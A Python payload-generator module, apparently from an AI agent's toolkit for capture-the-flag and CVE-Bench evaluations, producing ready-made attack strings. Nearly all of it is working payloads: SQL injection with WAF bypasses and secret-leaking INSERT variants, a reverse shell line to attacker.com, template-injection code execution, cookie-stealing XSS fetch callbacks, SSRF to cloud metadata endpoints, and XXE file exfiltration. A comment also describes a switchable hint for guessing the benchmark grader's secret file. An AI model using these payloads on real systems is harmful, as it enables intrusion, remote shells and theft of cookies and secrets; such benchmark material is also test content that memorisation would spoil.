"""Payload Generator Tool - common injection and web exploit payloads."""
from __future__ import annotations

import base64
import os
import urllib.parse


# ---------------------------------------------------------------------------
# Encoding utility
# ---------------------------------------------------------------------------

def encode_payload(payload: str, method: str = "url") -> str:
    """
    Encode a payload string.  method: url | double_url | html | base64 | hex
    """
    if method == "url":
        return urllib.parse.quote(payload)
    if method == "double_url":
        return urllib.parse.quote(urllib.parse.quote(payload))
    if method == "html":
        return (payload
                .replace("&", "&amp;")
                .replace("<", "&lt;")
                .replace(">", "&gt;")
                .replace('"', "&quot;")
                .replace("'", "&#x27;"))
    if method == "base64":
        return base64.b64encode(payload.encode()).decode()
    if method == "hex":
        return payload.encode().hex()
    return payload


# ---------------------------------------------------------------------------
# SQL Injection (WAF bypass + DB-specific variants)
# ---------------------------------------------------------------------------

def generate_sql_payload(
    injection_type: str = "union_select",
    comment_style: str = "mysql",
    num_columns: int = 3,
) -> dict:
    """
    Generate SQL injection payloads.

    injection_type: union_select | blind | error_based | boolean |
                    waf_bypass | postgresql | mssql | oracle
    """
    payloads: dict[str, str | None] = {}
    comment = "-- "
    cols = ",".join(str(i) for i in range(1, num_columns + 1))

    if injection_type == "union_select":
        payloads["basic"] = f"' UNION SELECT {cols}{comment}"
        payloads["with_where"] = f"' OR '1'='1{comment}"
        payloads["database_name"] = f"' UNION SELECT database(),2,3{comment}" if num_columns >= 3 else None
        payloads["version"] = f"' UNION SELECT version(),2,3{comment}" if num_columns >= 3 else None
        payloads["user"] = f"' UNION SELECT user(),2,3{comment}" if num_columns >= 3 else None

    elif injection_type == "blind":
        payloads["time_based"] = f"' AND SLEEP(5){comment}"
        payloads["condition_true"] = f"' AND '1'='1"
        payloads["condition_false"] = f"' AND '1'='2"

    elif injection_type == "error_based":
        payloads["extractvalue"] = f"' AND extractvalue(1,concat(0x7e,(SELECT @@version))){comment}"
        payloads["updatexml"] = f"' AND updatexml(1,concat(0x7e,(SELECT @@version)),1){comment}"

    elif injection_type == "boolean":
        payloads["true"] = f"' OR 1=1{comment}"
        payloads["false"] = f"' AND 1=2{comment}"

    # WAF bypass
    elif injection_type == "waf_bypass":
        payloads["comment_obfuscation"] = f"'/*!UNION*//*!SELECT*/ {cols}{comment}"
        payloads["case_mixing"] = f"' UnIoN SeLeCt {cols}{comment}"
        payloads["url_encoded"] = encode_payload(f"' UNION SELECT {cols}-- ", "url")
        payloads["space_comment"] = f"'/**/UNION/**/SELECT/**/{cols}{comment}"
        payloads["space_tab"] = f"'\tUNION\tSELECT\t{cols}{comment}"
        payloads["inline_comment"] = f"'/**/OR/**/1=1{comment}"

    # PostgreSQL
    elif injection_type == "postgresql":
        payloads["pg_sleep"] = f"'; SELECT pg_sleep(5){comment}"
        payloads["concat"] = f"' UNION SELECT NULL||version(),NULL,NULL{comment}"
        payloads["dollar_quote"] = f"'; SELECT $$id$${comment}"
        payloads["copy_to"] = f"'; COPY (SELECT version()) TO '/tmp/out.txt'{comment}"
        payloads["version"] = f"' UNION SELECT version(),NULL,NULL{comment}"

    # MSSQL
    elif injection_type == "mssql":
        payloads["waitfor"] = f"'; WAITFOR DELAY '0:0:5'{comment}"
        payloads["xp_cmdshell"] = f"'; EXEC xp_cmdshell('whoami'){comment}"
        payloads["stacked"] = f"'; SELECT @@version{comment}"
        payloads["error_convert"] = f"' AND 1=CONVERT(int,(SELECT @@version)){comment}"

    # SQLite-specific
    elif injection_type == "sqlite":
        payloads["error_quote"]  = "'"
        payloads["boolean_true"] = f"' OR 1=1--"
        payloads["boolean_false"] = f"' AND 1=2--"
        payloads["null_1col"]    = f"' UNION SELECT NULL--"
        payloads["null_2col"]    = f"' UNION SELECT NULL,NULL--"
        payloads["null_3col"]    = f"' UNION SELECT NULL,NULL,NULL--"
        payloads["version"]      = f"' UNION SELECT sqlite_version()--"
        payloads["tables"]       = f"' UNION SELECT name FROM sqlite_master WHERE type='table'--"
        payloads["columns"]      = f"' UNION SELECT sql FROM sqlite_master WHERE type='table'--"
        payloads["dump_1col"]    = f"' UNION SELECT group_concat(tbl_name) FROM sqlite_master WHERE type='table'--"

    # SQLite string-concatenation injection — for UPDATE/INSERT where input is in a string context
    # Query pattern: SET col = '<user_input>' → inject subquery via || operator. All variants
    # below are schema-agnostic: discover table/column names from sqlite_master /
    # pragma_table_info first, then build the targeted extraction from what that reveals,
    # rather than guessing a specific table/column name up front.
    elif injection_type == "sqlite_concat":
        payloads["probe"]             = "'||'probe'||'"
        payloads["tables"]            = "'||(SELECT group_concat(name) FROM sqlite_master WHERE type='table')||'"
        payloads["columns_generic"]   = "'||(SELECT sql FROM sqlite_master WHERE type='table' LIMIT 1)||'"
        payloads["dump_first_row"]    = "'||(SELECT group_concat(col) FROM (SELECT * FROM sqlite_master LIMIT 1))||'"
        payloads["user_table_cols"]   = "'||(SELECT sql FROM sqlite_master WHERE tbl_name LIKE '%user%' LIMIT 1)||'"
        payloads["user_table_cols_all"] = "'||(SELECT group_concat(name) FROM pragma_table_info((SELECT tbl_name FROM sqlite_master WHERE tbl_name LIKE '%user%' LIMIT 1)))||'"

    # INSERT injection — for endpoints where user input lands inside an INSERT VALUES clause
    elif injection_type == "insert_injection":
        # Pattern: VALUES ('<user_id>', '<INJECT>') → inject extra rows to leak data
        payloads["leak_secrets_by_username"] = "'), ((SELECT id FROM users WHERE username='attacker'), (SELECT content FROM secrets LIMIT 1)) --"
        payloads["leak_all_secrets"] = "'), ((SELECT id FROM users ORDER BY created_at LIMIT 1), (SELECT string_agg(content, '|') FROM secrets)) --"
        payloads["leak_first_secret"] = "'), ((SELECT id FROM users LIMIT 1), (SELECT content FROM secrets ORDER BY created_at LIMIT 1)) --"
        payloads["leak_by_not_me"] = "'), ((SELECT id FROM users ORDER BY created_at DESC LIMIT 1), (SELECT content FROM secrets WHERE owner_id != (SELECT id FROM users ORDER BY created_at DESC LIMIT 1) LIMIT 1)) --"
        payloads["probe_version"] = "'), ((SELECT id FROM users LIMIT 1), (SELECT version())) --"

    # Oracle
    elif injection_type == "oracle":
        payloads["pipe_concat"] = f"' UNION SELECT NULL||banner,NULL,NULL FROM v$version{comment}"
        payloads["dbms_pipe"] = f"'; EXEC DBMS_PIPE.RECEIVE_MESSAGE('a',5){comment}"
        payloads["rownum"] = f"' UNION SELECT banner,NULL,NULL FROM v$version WHERE ROWNUM=1{comment}"

    return {
        "injection_type": injection_type,
        "comment_style": comment_style,
        "payloads": {k: v for k, v in payloads.items() if v is not None},
    }


# ---------------------------------------------------------------------------
# Command Injection (encoded separators)
# ---------------------------------------------------------------------------

def generate_command_payload(
    injection_type: str = "shell",
    os_type: str = "linux",
) -> dict:
    """
    Generate command injection payloads.

    injection_type: shell | code_exec | encoded
    """
    payloads: dict[str, str] = {}

    if os_type == "linux":
        if injection_type == "shell":
            payloads["semicolon"] = "; whoami"
            payloads["pipe"] = "| whoami"
            payloads["and"] = "&& whoami"
            payloads["or"] = "|| whoami"
            payloads["newline"] = "\nwhoami"
            payloads["subshell"] = "$(whoami)"
            payloads["backticks"] = "`whoami`"
            payloads["reverse_shell"] = "; bash -i >& /dev/tcp/attacker.com/4444 0>&1"

        elif injection_type == "code_exec":
            payloads["php_eval"] = "; system($_GET['cmd'])"
            payloads["python_eval"] = "__import__('os').system('whoami')"
            payloads["nodejs_eval"] = "require('child_process').exec('whoami')"

        # encoded separators
        elif injection_type == "encoded":
            payloads["newline_url"] = "%0awhoami"
            payloads["ifs"] = "${IFS}whoami"
            payloads["brace"] = "{cat,/etc/passwd}"
            payloads["ifs_cmd"] = "$(IFS=,;cmd,whoami)"
            payloads["semicolon_url"] = "%3bwhoami"
            payloads["pipe_url"] = "%7cwhoami"
            payloads["null_byte"] = "whoami%00"

    elif os_type == "windows":
        if injection_type == "shell":
            payloads["and"] = "& whoami"
            payloads["pipe"] = "| whoami"
            payloads["and_and"] = "&& whoami"
            payloads["or"] = "|| whoami"
            payloads["powershell"] = "; powershell -c whoami"

        elif injection_type == "encoded":
            payloads["caret"] = "w^h^o^a^m^i"
            payloads["env_comspec"] = "%COMSPEC% /c whoami"
            payloads["amp_encoded"] = "%26whoami"

    return {
        "injection_type": injection_type,
        "os_type": os_type,
        "payloads": payloads,
    }


# ---------------------------------------------------------------------------
# SSTI
# ---------------------------------------------------------------------------

def generate_ssti_payload(engine: str = "jinja2") -> dict:
    """
    Generate SSTI payloads.  engine: jinja2 | twig | freemarker | mako | pebble
    """
    payloads: dict[str, str] = {}

    if engine == "jinja2":
        # RCE flag-reading payloads first — most likely to match success regex
        payloads["lipsum_flag"] = "{{lipsum.__globals__['os'].popen('cat /flag').read()}}"
        payloads["cycler_flag"] = "{{cycler.__init__.__globals__.os.popen('cat /flag').read()}}"
        payloads["find_flag"] = "{{lipsum.__globals__['os'].popen('find / -maxdepth 4 -name \"flag*\" 2>/dev/null | head -3 | xargs cat 2>/dev/null').read()}}"
        payloads["lipsum_rce"] = "{{lipsum.__globals__['os'].popen('id').read()}}"
        payloads["cycler_rce"] = "{{cycler.__init__.__globals__.os.popen('id').read()}}"
        payloads["probe"] = "{{7*7}}"
        payloads["config_dump"] = "{{config}}"
        payloads["class_walk"] = "{{''.__class__.__mro__[1].__subclasses__()}}"

    elif engine == "twig":
        payloads["probe"] = "{{7*7}}"
        payloads["rce"] = "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}"
        payloads["system"] = "{{['id']|filter('system')}}"

    elif engine == "freemarker":
        payloads["probe"] = "${7*7}"
        payloads["rce"] = '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}'
        payloads["new_exec"] = '${"freemarker.template.utility.Execute"?new()("id")}'

    elif engine == "mako":
        payloads["probe"] = "${7*7}"
        payloads["rce"] = "${__import__('os').popen('id').read()}"

    elif engine == "pebble":
        payloads["probe"] = "{{7*7}}"
        payloads["rce"] = '{%import "java.lang.Runtime" as rt%}{{rt.exec("id")}}'

    return {
        "injection_type": engine,
        "engine": engine,
        "payloads": payloads,
    }


# ---------------------------------------------------------------------------
# NoSQL Injection
# ---------------------------------------------------------------------------

def generate_nosql_payload(injection_type: str = "operator") -> dict:
    """
    Generate NoSQL (MongoDB) injection payloads.

    injection_type: operator | where_js | array_injection | json_body
    """
    payloads: dict[str, str] = {}

    if injection_type == "operator":
        payloads["ne_null"] = '{"$ne": null}'
        payloads["gt_empty"] = '{"$gt": ""}'
        payloads["regex_all"] = '{"$regex": ".*"}'
        payloads["where_true"] = '{"$where": "1==1"}'
        payloads["nin_bypass"] = '{"$nin": ["impossible_value"]}'

    elif injection_type == "where_js":
        payloads["sleep"] = '{"$where": "sleep(5000) || 1==1"}'
        payloads["tautology"] = '{"$where": "function(){return true}"}'
        payloads["exfil"] = '{"$where": "this.password.match(/.*/)"}'

    elif injection_type == "array_injection":
        payloads["ne_param"] = "password[$ne]=x"
        payloads["regex_param"] = "username[$regex]=.*"
        payloads["gt_param"] = "age[$gt]=0"

    elif injection_type == "json_body":
        payloads["auth_bypass"] = '{"username":{"$ne":null},"password":{"$ne":null}}'
        payloads["regex_enum"] = '{"username":{"$regex":"^admin"},"password":{"$ne":"x"}}'

    return {
        "injection_type": injection_type,
        "payloads": payloads,
    }


# ---------------------------------------------------------------------------
# LDAP Injection
# ---------------------------------------------------------------------------

def generate_ldap_payload(injection_type: str = "filter_bypass") -> dict:
    """
    Generate LDAP injection payloads.

    injection_type: filter_bypass | wildcard | dn_injection | blind
    """
    payloads: dict[str, str] = {}

    if injection_type == "filter_bypass":
        payloads["wildcard_all"] = "*"
        payloads["always_true"] = "*)(uid=*))(|(uid=*"
        payloads["close_filter"] = "*)(objectClass=*"
        payloads["bypass_auth"] = "admin)(&)"
        payloads["inject_or"] = "*(|(password=*))"

    elif injection_type == "wildcard":
        payloads["enumerate_a"] = "a*"
        payloads["enumerate_all"] = "*"

    elif injection_type == "dn_injection":
        payloads["dn_bypass"] = "cn=admin,dc=example,dc=com"
        payloads["null_byte"] = "admin\x00"
        payloads["escape_paren"] = "admin\\29"

    elif injection_type == "blind":
        payloads["true_cond"] = "admin)(|(a=a"
        payloads["false_cond"] = "admin)(|(a=b"
        payloads["char_enum"] = "admin)(|(cn=a*"

    return {
        "injection_type": injection_type,
        "payloads": payloads,
    }


# ---------------------------------------------------------------------------
# XPath Injection
# ---------------------------------------------------------------------------

def generate_xpath_payload(injection_type: str = "auth_bypass") -> dict:
    """
    Generate XPath injection payloads.

    injection_type: auth_bypass | union_like | blind_string | blind_number
    """
    payloads: dict[str, str] = {}

    if injection_type == "auth_bypass":
        payloads["always_true"] = "' or '1'='1"
        payloads["comment"] = "admin'--"
        payloads["close_bracket"] = "'] | //* | //*['"
        payloads["or_inject"] = "' or 1=1 or '1'='1"

    elif injection_type == "union_like":
        payloads["root_name"] = "' or name(/*[1])='root"
        payloads["count_nodes"] = "' or count(//*)>0 or '1'='1"
        payloads["string_val"] = "' or string(//user[1]/password)='x' or '1'='1"

    elif injection_type == "blind_string":
        payloads["first_char"] = "' or substring(//user[1]/password,1,1)='a' or '1'='2"
        payloads["str_length"] = "' or string-length(//user[1]/password)>5 or '1'='2"

    elif injection_type == "blind_number":
        payloads["count_eq1"] = "' or count(//user)=1 or '1'='2"
        payloads["position_1"] = "' or position()=1 or '1'='2"

    return {
        "injection_type": injection_type,
        "payloads": payloads,
    }


# ---------------------------------------------------------------------------
# CRLF / Header Injection
# ---------------------------------------------------------------------------

def generate_crlf_payload(injection_type: str = "header_split") -> dict:
    """
    Generate CRLF / header injection payloads.

    injection_type: header_split | response_split | log_inject | cookie_inject
    """
    payloads: dict[str, str] = {}

    if injection_type == "header_split":
        payloads["crlf_basic"] = "%0d%0aX-Injected: header"
        payloads["lf_only"] = "%0aX-Injected: header"
        payloads["double_encoded"] = "%250d%250aX-Injected: header"

    elif injection_type == "response_split":
        payloads["inject_200"] = "%0d%0a%0d%0aHTTP/1.1 200 OK%0d%0aContent-Length: 0%0d%0a"
        payloads["xss_split"] = "%0d%0aContent-Type: text/html%0d%0a%0d%0a<script>alert(1)</script>"

    elif injection_type == "log_inject":
        payloads["newline_log"] = "%0aFAKE LOG ENTRY"
        payloads["crlf_log"] = "%0d%0aFAKE LOG ENTRY"
        payloads["auth_forge"] = "%0d%0a[AUTH] admin login success"

    elif injection_type == "cookie_inject":
        payloads["set_cookie"] = "%0d%0aSet-Cookie: session=admin; Path=/"
        payloads["steal_cookie"] = "%0d%0aSet-Cookie: PHPSESSID=injected; HttpOnly=false"

    return {
        "injection_type": injection_type,
        "payloads": payloads,
    }


# ---------------------------------------------------------------------------
# Path Traversal / Local File Inclusion
# ---------------------------------------------------------------------------

def generate_path_traversal_payload(injection_type: str = "linux_file_read") -> dict:
    """
    Generate path traversal payloads.

    injection_type: linux_file_read | encoding_bypass | windows_file_read
    """
    payloads: dict[str, str] = {}

    if injection_type == "linux_file_read":
        payloads["etc_passwd_6"] = "../../../../../../etc/passwd"
        payloads["etc_passwd_10"] = "../../../../../../../../../../etc/passwd"
        payloads["absolute_etc_passwd"] = "/etc/passwd"
        payloads["proc_self_environ"] = "../../../../../../proc/self/environ"
        payloads["app_config"] = "../../../../../../app/config.py"

    elif injection_type == "encoding_bypass":
        payloads["url_encoded"] = "..%2f..%2f..%2f..%2fetc%2fpasswd"
        payloads["double_encoded"] = "..%252f..%252f..%252f..%252fetc%252fpasswd"
        payloads["mixed_slashes"] = "..%2f..%5c..%2f..%5cetc%2fpasswd"
        payloads["dotdot_semicolon"] = "..;/..;/..;/..;/etc/passwd"
        payloads["null_byte"] = "../../../../../../etc/passwd%00"

    elif injection_type == "windows_file_read":
        payloads["win_ini"] = "..\\..\\..\\..\\windows\\win.ini"
        payloads["hosts"] = "..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts"
        payloads["absolute_hosts"] = "C:\\Windows\\System32\\drivers\\etc\\hosts"

    elif injection_type == "cvebench_secret":
        # Hardcoded to CVE-Bench's own proof-secret file location (/tmp/secret,
        # /tmp/uploads/secret) — this is benchmark-scaffold knowledge, not something a
        # real-world attacker would know, and would let the agent "solve" path-traversal
        # CVE-Bench targets by guessing the grader's answer file rather than by finding
        # the vulnerability. Default OFF for an objective baseline (same pattern as
        # CTF_DIRECT_SQL_FALLBACK); set CVEBENCH_SECRET_PATH_HINT=1 only for an explicit,
        # disclosed ablation run measuring its effect on CVE-Bench path-traversal solve rate.
        if os.getenv("CVEBENCH_SECRET_PATH_HINT", "0") == "1":
            payloads["secret_absolute"] = "/tmp/secret"
            payloads["secret_traversal_4"] = "../../../../tmp/secret"
            payloads["secret_traversal_8"] = "../../../../../../../../tmp/secret"
            payloads["uploads_secret_absolute"] = "/tmp/uploads/secret"
            payloads["uploads_secret_traversal"] = "../../../../../../tmp/uploads/secret"

    return {
        "injection_type": injection_type,
        "payloads": payloads,
    }


# ---------------------------------------------------------------------------
# XSS / HTML Injection
# ---------------------------------------------------------------------------

def generate_xss_payload(injection_type: str = "reflected", callback_url: str = "") -> dict:
    """
    Generate XSS payloads.

    injection_type: reflected | stored | attribute | svg | callback
    callback_url: optional URL that receives proof data.
    """
    payloads: dict[str, str] = {}
    cb = callback_url or "http://target:9091/upload"

    if injection_type == "reflected":
        payloads["script_alert"] = "<script>alert(1)</script>"
        payloads["img_onerror"] = '<img src=x onerror="alert(1)">'
        payloads["body_onload"] = '<body onload="alert(1)">'

    elif injection_type == "stored":
        payloads["stored_script"] = "<script>document.body.setAttribute('data-xss','1')</script>"
        payloads["stored_img"] = '<img src=x onerror="document.body.setAttribute(\'data-xss\',\'1\')">'

    elif injection_type == "attribute":
        payloads["quote_breakout"] = '" autofocus onfocus="alert(1)" x="'
        payloads["single_quote_breakout"] = "' autofocus onfocus='alert(1)' x='"
        payloads["href_js"] = "javascript:alert(1)"

    elif injection_type == "svg":
        payloads["svg_onload"] = '<svg onload="alert(1)"></svg>'
        payloads["svg_animate"] = '<svg><animate onbegin="alert(1)" attributeName=x dur=1s></animate></svg>'

    elif injection_type == "callback":
        payloads["cookie_get"] = f"<script>fetch('{cb}?c='+encodeURIComponent(document.cookie))</script>"
        payloads["cookie_post_json"] = (
            "<script>fetch('"
            + cb
            + "',{method:'POST',headers:{'Content-Type':'application/json'},"
            + "body:JSON.stringify({'xss':document.cookie||document.domain})})</script>"
        )
        payloads["img_callback"] = f"<img src=x onerror=\"new Image().src='{cb}?x='+encodeURIComponent(document.domain)\">"

    return {
        "injection_type": injection_type,
        "callback_url": callback_url,
        "payloads": payloads,
    }


# ---------------------------------------------------------------------------
# SSRF
# ---------------------------------------------------------------------------

def generate_ssrf_payload(
    injection_type: str = "internal_http",
    callback_url: str = "",
    outbound_url: str = "",
) -> dict:
    """
    Generate SSRF payloads.

    injection_type: internal_http | metadata | callback | bypass
    callback_url: evaluator/proof URL that should be hit by the vulnerable server.
    outbound_url: CVE-Bench outbound service URL when supplied by metadata.
    """
    payloads: dict[str, str] = {}
    cb = callback_url or "http://target:9091/upload"
    outbound = outbound_url or "http://localhost:8000"

    if injection_type == "internal_http":
        payloads["localhost"] = "http://127.0.0.1/"
        payloads["localhost_9091_health"] = "http://127.0.0.1:9091/health"
        payloads["docker_target_health"] = "http://target:9091/health"
        payloads["docker_target_done"] = "http://target:9091/done"

    elif injection_type == "metadata":
        payloads["aws_metadata"] = "http://169.254.169.254/latest/meta-data/"
        payloads["gcp_metadata"] = "http://metadata.google.internal/computeMetadata/v1/"
        payloads["k8s_serviceaccount"] = "http://127.0.0.1:8001/api/v1/namespaces/default/secrets"

    elif injection_type == "callback":
        payloads["proof_upload"] = cb
        payloads["proof_upload_health"] = cb.rsplit("/", 1)[0] + "/health" if "/" in cb else cb
        payloads["outbound_service"] = outbound

    elif injection_type == "bypass":
        payloads["localhost_decimal"] = "http://2130706433/"
        payloads["localhost_hex"] = "http://0x7f000001/"
        payloads["localhost_ipv6"] = "http://[::1]/"
        payloads["at_bypass"] = "http://allowed.example@127.0.0.1:9091/health"

    return {
        "injection_type": injection_type,
        "callback_url": callback_url,
        "outbound_url": outbound_url,
        "payloads": payloads,
    }


# ---------------------------------------------------------------------------
# XXE
# ---------------------------------------------------------------------------

def generate_xxe_payload(
    injection_type: str = "file_read",
    file_path: str = "/tmp/secret",
    callback_url: str = "",
) -> dict:
    """
    Generate XXE payload documents.

    injection_type: file_read | oob | parameter_entity | svg
    file_path: server-side file to read.
    callback_url: optional evaluator/proof URL for out-of-band probes.
    """
    payloads: dict[str, str] = {}
    cb = callback_url or "http://target:9091/upload"

    if injection_type == "file_read":
        payloads["direct_file"] = (
            '<?xml version="1.0"?>\n'
            '<!DOCTYPE root [<!ENTITY xxe SYSTEM "file://'
            + file_path
            + '">]>\n<root>&xxe;</root>'
        )
        payloads["etc_passwd"] = (
            '<?xml version="1.0"?>\n'
            '<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>\n<root>&xxe;</root>'
        )

    elif injection_type == "oob":
        payloads["external_http"] = (
            '<?xml version="1.0"?>\n'
            '<!DOCTYPE root [<!ENTITY xxe SYSTEM "'
            + cb
            + '">]>\n<root>&xxe;</root>'
        )

    elif injection_type == "parameter_entity":
        payloads["parameter_file"] = (
            '<?xml version="1.0"?>\n'
            '<!DOCTYPE root [<!ENTITY % file SYSTEM "file://'
            + file_path
            + '"><!ENTITY % eval "<!ENTITY xxe SYSTEM \'http://target:9091/upload?x=%file;\'>">%eval;]>\n'
            '<root>&xxe;</root>'
        )

    elif injection_type == "svg":
        payloads["svg_file_entity"] = (
            '<?xml version="1.0" standalone="yes"?>\n'
            '<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file://'
            + file_path
            + '">]>\n'
            '<svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>'
        )

    return {
        "injection_type": injection_type,
        "file_path": file_path,
        "callback_url": callback_url,
        "payloads": payloads,
    }
